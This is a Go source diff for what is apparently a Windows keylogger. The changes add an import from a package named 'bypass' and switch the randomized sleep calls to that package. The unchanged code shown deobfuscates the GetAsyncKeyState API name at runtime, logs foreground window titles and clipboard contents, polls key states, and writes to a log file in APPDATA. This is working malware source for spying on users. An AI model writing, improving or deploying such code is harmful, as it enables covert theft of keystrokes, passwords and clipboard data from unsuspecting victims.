@@ -7,6 +7,7 @@ import (
 	"unsafe"
 
 	"github.com/atotto/clipboard"
+	"github.com/whiterabb17/gryphon/bypass"
 )
 
 var tmpPath string = os.Getenv("APPDATA") + "\\keylogs.log"
@@ -34,7 +35,7 @@ var procGetAsyncKeyState = user32.NewProc(Deobfuscate("HfuBtzodLfzTubuf"))      
 var caps bool
 var shift bool
 
-//Get Active Window Title
+// Get Active Window Title
 func getForegroundWindow() (hwnd syscall.Handle, err error) {
 	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
 	if e1 != 0 {
@@ -71,7 +72,7 @@ func windowLogger() {
 				tmpPath += string("\r\n[" + syscall.UTF16ToString(b) + "]\r\n")
 			}
 		}
-		time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
+		time.Sleep(time.Duration(bypass.RandInt(1, 5)) * time.Millisecond)
 	}
 }
 
@@ -83,7 +84,7 @@ func clipboardLogger() {
 			tmp = text
 			tmpKeylog += string("\r\n[Clipboard: " + text + "]\r\n")
 		}
-		time.Sleep(time.Duration(randInt(1, 5)) * time.Second)
+		time.Sleep(time.Duration(bypass.RandInt(1, 5)) * time.Second)
 	}
 }
 
@@ -170,7 +171,7 @@ const (
 
 func keyLogger() {
 	for {
-		time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
+		time.Sleep(time.Duration(bypass.RandInt(1, 5)) * time.Millisecond)
 		shiftchk, _, _ := procGetAsyncKeyState.Call(uintptr(vk_SHIFT))
 		if shiftchk == 0x8000 {
 			shift = true
